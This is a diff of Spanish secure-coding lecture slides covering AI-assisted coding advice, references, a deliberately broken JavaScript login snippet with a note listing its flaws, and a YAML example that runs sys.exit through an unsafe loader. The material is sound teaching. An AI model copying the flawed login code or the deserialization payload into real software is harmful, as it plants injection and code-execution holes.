 - [Backdoor in upstream xz/liblzma leading to ssh server compromise (2024)](https://www.openwall.com/lists/oss-security/2024/03/29/4)
 
-## Auditoría de librerías
-
-Ejemplo de auditoría de librerías, veremos más detalles en las siguientes sesiones
-
-```
-npm audit
-```
-
 ---
 
-Pero... no te fies de nadie
+No te fies de nadie...
 
 ![center h=20em](images/coding/audit-fail.png)
 
-## Cuidado con la inteligencia artificial
-<!-- _class: with-warning -->
+# VibeCoding with Artificial Inteligence
+<!-- _class: lead -->
 
-Asistentes de código:
+## Recomendaciones
 
-- ChatGPT, escribe código a partir de lenguaje natural
-- CoPilot, propone código a partir de un esqueleto que escribimos nosotros
+1. Tú eres el desarrollador, la IA es ayudante. La responsabilidad será tuya
+1. Aplica las Best Practices siempre: code reviews, testing, static analysis, documentation, and version control
+1. Piensa en la seguridad desde el principio
+1. Guía a la IA
+1. Pide a la IA que ella misma mejore el trabajo: diseño incremental
+1. Pregunta tus dudas y expresa tus inquietudes
 
-![bg left:45% w:100%](images/coding/AI_2.jpg)
+> https://best.openssf.org/Security-Focused-Guide-for-AI-Code-Assistant-Instructions
 
+## Workflow
 
-ChatGPT propone código con SQL Injection y CoPilot mete vulnerabilidades
+1. Haz el modelado de amenazas, prioriza y detecta requisitos de seguridad
+1. Diseña la arquitectura del sistema, con o sin ayuda
+1. Escribe los pasos anteriores en un documento. Ejemplo: CLAUDE.md
+1. Deja que la IA escriba el sistema
+1. Diseño iterativo:
+    - Asegúrate de que todo funciona
+    - Añade tests unitarios
+    - Instrucciones de uso de control de versiones
+    - Actualiza documentación
 
-> https://www.elladodelmal.com/2022/12/chatgpt-hace-codigo-con-sql-injection.html?m=1
-> https://www.elladodelmal.com/2022/09/copilot-y-su-codigo-inseguro-o-como-la.html
+---
 
+Ejemplo: https://github.com/Juanvvc/passmanager2
 
 ## Referencias
 <!-- _class: lead -->
 
 ---
 
+- "The Protection of Information in Computer Systems", JEROME H. SALTZER and MICHAEL D. SCHROEDER, 1974
 - https://brightsec.com/blog/xss-attack/
-- https://www.securecoding.com/blog/best-python-open-source-security-tools/
 - https://snyk.io/blog/python-security-best-practices-cheat-sheet/
+- [OWASP HTML5 Security cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
 - [Do Users Write More Insecure Code with AI Assistants?](https://arxiv.org/pdf/2211.03622.pdf), Universidad de Stanford. 16 de diciembre 2022
 - [Asleep at the Keyboard? Assessing the
 Security of GitHub Copilot’s Code Contribution](https://arxiv.org/pdf/2108.09293.pdf), diciembre 2021
-- https://rules.sonarsource.com/
+- [C# Bad Practices: Learn How to Make Good Code by Using Examples of Bad Code](https://www.codeproject.com/Articles/1083348/Csharp-Bad-Practices-Learn-How-to-Make-Good-Code-b)
+- [For every 10 likes this gets, I will ask ChatGPT to make this code more insecure](https://twitter.com/LiveOverflow/status/1729798452094128278)
+
 
 
 ## Para practicar: Bwapp
@@ -973,6 +734,110 @@ https://owasp.org/www-project-webgoat/
 <!--
 Nota: no he sido capaz de ejecutar WebWolf desde el docker, quizá prefieras hacerlo en tu propio PC
 -->
+
+## Ejemplo 1
+
+```javascript
+function authenticateUsers(username, password) {
+    var accounts = apiService.sql("SELECT * FROM users");
+    for(var i=0, i<accounts.length; i++) {
+        var account = account[i];
+        if(account.username === username && account.password === password) {
+            return true;
+        }
+        if ("true" === "true") {
+            return false;
+        }
+    }
+}
+$("#login").click(function () {
+    var username = $("#username").val();
+    var password = $("#password").val();
+    var authenticated = authenticatedUser(username, password);
+    if (authenticated === true) {
+        $.cookie('loggedin', 'yes', {expires: 1});
+    } else if (authenticated === false) {
+        $("error_message").show(LogIn Failed);
+    }
+});
+```
+
+> https://twitter.com/hot_girl_spring/status/1853430439022670236
+
+<!--
+This code snippet contains several issues that indicate a lack of experience, which is likely why it was shared with the caption, "I don't think the intern will last much longer." Here are some specific issues:
+
+Potential SQL Injection: The code uses apiService.sql("SELECT * FROM users") to retrieve user data. If apiService.sql doesn't implement SQL injection protection, this approach could expose the database to attacks. Typically, prepared statements or ORM (Object-Relational Mapping) tools are used to avoid this risk.
+
+Inefficient Authentication Logic: The authenticateUser function iterates through all user accounts in the database (for (var i = 0; i < accounts.length; i++)). In a real-world application, fetching all user records to find a single match is highly inefficient and poses security risks by unnecessarily loading all user data.
+
+Hardcoded Condition Always Returning False: At the end of authenticateUser, there's an if ("true" === "true") { return false; } condition, which always evaluates to true and will always return false, regardless of whether the user credentials are correct. This effectively prevents any user from logging in successfully, making the authentication function useless.
+
+Unsecure Cookie Storage: The code uses $.cookie('loggedin', 'yes', { expires: 1 }); to set a login cookie without any additional security configurations, such as HttpOnly or Secure flags. This makes the cookie vulnerable to client-side manipulation or interception in non-HTTPS contexts.
+
+Potential Incorrect Error Handling: The line $("error_message").show(LogIn Failed) appears to be missing proper syntax for displaying the error message. It should likely be $("#error_message").show("Login Failed");, where # selects the element by ID, and "Login Failed" should be wrapped in quotes.
+
+These issues are commonly made by beginners and can lead to performance problems and significant security vulnerabilities, which is likely why the post humorously suggests that "the intern won't last much longer."
+-->
+
+## Input validation: templates
+
+```python
+import yaml
+
+input = '''
+title: Título de Prueba
+alumnos:
+    - María
+    - Eva
+    - Alberto
+    - Jorge
+'''
+
+clase = yaml.load(input, yaml.BaseLoader)
+print(clase['alumnos'])
+
+# Salida: ['María', 'Eva', 'Alberto', 'Jorge']
+```
+
+- <https://cwe.mitre.org/data/definitions/502.html>
+
+---
+
+```python
+import yaml
+
+input = '!!python/object/new:sys.exit [42]'
+yaml.load(input, Loader=yaml.UnsafeLoader)
+```
+
+¿Cuál es la salida de este comando?
+
+> https://theconversation.com/what-is-log4j-a-cybersecurity-expert-explains-the-latest-internet-vulnerability-how-bad-it-is-and-whats-at-stake-173896
+
+<!--
+Un ejemplo de esta vulnerabildad que nos tuvo varias semanas pegados a la pantalla en 2021 fue log4j
+-->
+
+## Valida lo que dice el usuario
+
+- Verifica que todos los datos recibidos cumplan con las propiedades o tipos de datos esperados
+- Mucho cuidado con permitir entender las entradas de los usuarios como código
+- Top 10 de OWASP y SANS
+
+- CWE:
+    - https://cwe.mitre.org/data/definitions/710.html
+    - https://cwe.mitre.org/data/definitions/1006.html
+
+---
+
+![center h:18em](images/coding/validation-example.png)
+
+El bug no es obvio: si `file` es un path absoluto, ignora los paths anteriores: <https://docs.python.org/3/library/os.path.html>
+
+---
+
+![center h:20em](images/coding/mediation-example.png)
 
 
 # ¡Gracias!
